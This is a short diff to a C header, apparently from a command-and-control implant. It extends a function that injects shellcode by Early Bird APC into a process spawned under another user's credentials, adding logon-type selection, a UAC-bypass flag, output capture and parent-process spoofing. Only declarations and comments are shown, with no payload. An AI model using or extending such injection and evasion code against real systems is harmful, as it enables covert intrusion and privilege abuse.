@@ -37,13 +37,18 @@ int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
 
 /*
  * Early Bird APC injection into g_spawnto_path, spawned under another user's credentials.
- * Uses CreateProcessWithLogonW with LOGON_WITH_PROFILE (full token, process runs as the target user).
- * domain: NetBIOS domain or "." for local account.
- * Returns 1 on success - caller owns out->hProcess and out->hThread.
+ * logon_type: 2=Interactive, 9=NewCredentials → CreateProcessWithLogonW.
+ *             3=Network, 4=Batch, 5=Service, 8=NetworkCleartext → LogonUser + SetThreadToken.
+ * domain: NetBIOS domain name. Pass NULL or empty to let Windows auto-resolve.
+ * capture_output: if 1, redirects stdout/stderr to an anonymous pipe; caller drains
+ *   out->hPipeRead via read_pipe_output(out->hPipeRead, out->hProcess) then CloseHandle.
+ *   Types 3/4/5/8 also get PPID spoof (compatible with CreateProcessW).
+ * Returns 1 on success - caller owns out->hProcess, out->hThread, out->hPipeRead.
  * Returns 0 on failure - errmsg filled with reason.
  */
 int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len,
                              const char *username, const char *domain, const char *password,
+                             int logon_type, int bypass_uac, int capture_output,
                              EarlyBirdResult *out, char *errmsg, size_t errmsg_len);
 
 #endif /* INCLUDE_CMD_SPAWN || ... || INCLUDE_CMD_EXECUTE_ASSEMBLY || INCLUDE_CMD_BLOCKDLLS */
